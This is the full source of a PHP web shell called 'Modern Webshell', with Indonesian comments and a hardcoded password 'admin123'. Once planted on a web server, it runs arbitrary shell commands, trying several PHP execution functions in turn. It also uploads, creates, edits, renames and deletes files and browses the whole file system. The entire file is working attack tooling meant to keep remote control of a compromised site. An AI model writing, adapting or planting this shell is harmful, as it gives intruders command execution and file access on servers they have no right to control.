<?php
session_start();
error_reporting(0);

// Password proteksi (ubah password sesuai keinginanmu)
$password = "admin123";
if (!isset($_SESSION['auth'])) {
    if ($_POST['pass'] === $password) {
        $_SESSION['auth'] = true;
    } else {
        echo '<form method="post" style="margin-top:20%;text-align:center;"><input type="password" name="pass" placeholder="Enter Password" style="padding:10px;" /><br><br><button type="submit">Login</button></form>';
        exit;
    }
}

// Fungsi eksekusi command fallback
function exec_cmd($cmd) {
    if (function_exists("shell_exec")) return shell_exec($cmd);
    elseif (function_exists("system")) {
        ob_start(); system($cmd); return ob_get_clean();
    } elseif (function_exists("exec")) {
        exec($cmd, $out); return implode("\n", $out);
    } elseif (function_exists("passthru")) {
        ob_start(); passthru($cmd); return ob_get_clean();
    }
    return "Command functions disabled.";
}

// Navigasi folder
$cwd = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
chdir($cwd);

// Buat file
if (isset($_POST['newfile'])) {
    file_put_contents($_POST['filename'], $_POST['filecontent']);
}

// Buat folder
if (isset($_POST['newfolder'])) {
    mkdir($_POST['foldername']);
}

// Upload
if (isset($_FILES['upload'])) {
    move_uploaded_file($_FILES['upload']['tmp_name'], $_FILES['upload']['name']);
}

// Edit file
if (isset($_POST['editfile'])) {
    file_put_contents($_POST['editname'], $_POST['editcontent']);
}

// Delete file/folder
if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (is_dir($target)) rmdir($target);
    else unlink($target);
}

// Rename
if (isset($_POST['rename'])) {
    rename($_POST['oldname'], $_POST['newname']);
}

$files = scandir($cwd);
?>

<!DOCTYPE html>
<html>
<head>
    <title>Modern Webshell</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-900 text-green-400 font-mono p-4">
    <h1 class="text-2xl mb-4">WebShell - <?= htmlspecialchars($cwd) ?></h1>

    <form method="post" class="mb-4">
        <input type="text" name="cmd" class="w-full p-2 bg-black text-green-300" placeholder="Enter command..." />
        <button type="submit" class="bg-green-700 px-4 py-1 mt-2">Execute</button>
    </form>
    <?php
    if ($_POST['cmd']) {
        echo "<pre class='bg-black p-3 mt-2 text-sm'>" . htmlspecialchars(exec_cmd($_POST['cmd'])) . "</pre>";
    }
    ?>

    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 my-6">
        <form method="post" enctype="multipart/form-data" class="bg-gray-800 p-4 rounded">
            <h2 class="text-lg mb-2">Upload File</h2>
            <input type="file" name="upload" class="text-green-300" />
            <button type="submit" class="bg-green-700 px-4 py-1 mt-2">Upload</button>
        </form>

        <form method="post" class="bg-gray-800 p-4 rounded">
            <h2 class="text-lg mb-2">New File</h2>
            <input type="text" name="filename" placeholder="example.txt" class="w-full mb-2 bg-black p-1" />
            <textarea name="filecontent" rows="3" class="w-full bg-black p-1 mb-2"></textarea>
            <button type="submit" name="newfile" class="bg-green-700 px-4 py-1">Create</button>
        </form>

        <form method="post" class="bg-gray-800 p-4 rounded">
            <h2 class="text-lg mb-2">New Folder</h2>
            <input type="text" name="foldername" placeholder="foldername" class="w-full mb-2 bg-black p-1" />
            <button type="submit" name="newfolder" class="bg-green-700 px-4 py-1">Create Folder</button>
        </form>

        <form method="post" class="bg-gray-800 p-4 rounded">
            <h2 class="text-lg mb-2">Rename</h2>
            <input type="text" name="oldname" placeholder="oldname.txt" class="w-full mb-2 bg-black p-1" />
            <input type="text" name="newname" placeholder="newname.txt" class="w-full mb-2 bg-black p-1" />
            <button type="submit" name="rename" class="bg-green-700 px-4 py-1">Rename</button>
        </form>
    </div>

    <div class="bg-gray-800 p-4 rounded">
        <h2 class="text-lg mb-2">Directory</h2>
        <?php if ($cwd != "/"): ?>
            <a href="?path=<?= urlencode(dirname($cwd)) ?>" class="text-blue-400">[..]</a><br>
        <?php endif; ?>

        <?php foreach ($files as $f): ?>
            <?php
                if ($f == ".") continue;
                $path = $cwd . DIRECTORY_SEPARATOR . $f;
                $link = "?path=" . urlencode($path);
            ?>
            <div class="flex justify-between items-center border-b border-gray-700 py-1">
                <div>
                    <?php if (is_dir($path)): ?>
                        📁 <a href="<?= $link ?>" class="text-blue-400"><?= htmlspecialchars($f) ?></a>
                    <?php else: ?>
                        📄 <?= htmlspecialchars($f) ?>
                    <?php endif; ?>
                </div>
                <div class="text-sm space-x-2">
                    <?php if (!is_dir($path)): ?>
                        <a href="?edit=<?= urlencode($path) ?>" class="text-yellow-300">Edit</a>
                    <?php endif; ?>
                    <a href="?delete=<?= urlencode($path) ?>" onclick="return confirm('Delete <?= $f ?>?')" class="text-red-400">Delete</a>
                </div>
            </div>
        <?php endforeach; ?>
    </div>

    <?php if (isset($_GET['edit']) && is_file($_GET['edit'])): ?>
        <?php $editContent = file_get_contents($_GET['edit']); ?>
        <div class="bg-gray-800 p-4 mt-6 rounded">
            <h2 class="text-lg mb-2">Editing: <?= htmlspecialchars($_GET['edit']) ?></h2>
            <form method="post">
                <input type="hidden" name="editname" value="<?= htmlspecialchars($_GET['edit']) ?>" />
                <textarea name="editcontent" rows="10" class="w-full bg-black p-2 text-green-300"><?= htmlspecialchars($editContent) ?></textarea><br>
                <button type="submit" name="editfile" class="bg-green-700 px-4 py-1 mt-2">Save</button>
            </form>
        </div>
    <?php endif; ?>
</body>
</html>
